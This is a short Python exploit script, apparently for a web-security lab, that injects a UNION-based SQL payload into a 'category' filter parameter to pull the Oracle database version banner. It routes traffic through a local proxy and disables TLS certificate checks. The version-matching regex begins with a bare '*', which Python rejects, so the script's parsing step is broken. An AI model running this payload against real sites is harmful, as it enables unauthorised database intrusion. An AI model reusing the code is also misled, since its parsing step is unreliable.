import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def exploit(url):
    uri = "filter?category="
    payload = "' union select banner, null from v$version-- -"
    request = requests.get(url + uri + payload, verify=False, proxies=proxies)
    response = request.text
    if "Oracle Database" in response:
        print("[+] status: success")
        soup = BeautifulSoup(response, 'html.parser')
        ver = soup.find(text=re.compile('*.Oracle\sDatabase.*'))
        print(f"[+] version: {ver}")
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[!] error: {sys.argv[0]} <url>")
        sys.exit(1)
    print("[~] detecting version...")
    if not exploit(url):
        print("[-] status: failure")
